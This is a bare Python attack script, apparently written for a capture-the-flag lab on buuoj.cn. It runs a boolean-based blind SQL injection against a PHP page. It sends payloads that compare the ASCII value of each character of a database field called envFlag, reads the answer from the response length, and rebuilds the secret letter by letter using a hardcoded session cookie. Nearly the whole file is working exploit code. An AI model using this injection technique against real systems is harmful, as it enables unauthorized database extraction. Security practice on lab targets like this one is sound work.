import time
import requests
import string
cookies = {
    'PHPSESSID': 'ib14j7ao0usnmctbl3d4o8djo0',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Content-Length': '0',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    # 'Cookie': 'PHPSESSID=iulib2sfr01c2pchou9bjiaaq5',
}

url="http://45fd88f6-b31d-4bd6-b280-efd22af3193b.node4.buuoj.cn:81/control/sqlinject/bool_injection.php?id="
res=""
for i in range(1,10):
    for s in string.ascii_lowercase:
        # print(s)
        # 1' and ascii(substr((select envFlag from env_list limit 1,1),1,1))=102
        payload=f"1' and ascii(substr((select envFlag from env_list limit 1,1),{i},1))={ord(s)} --+"
        url1=url+payload
        # print(url)
        response = requests.post(url1, cookies=cookies, headers=headers, verify=False)
        time.sleep(0.2)
        print("")
        if len(response.text)>4000:
            res+=s
            print(res,end="")
        print(res)
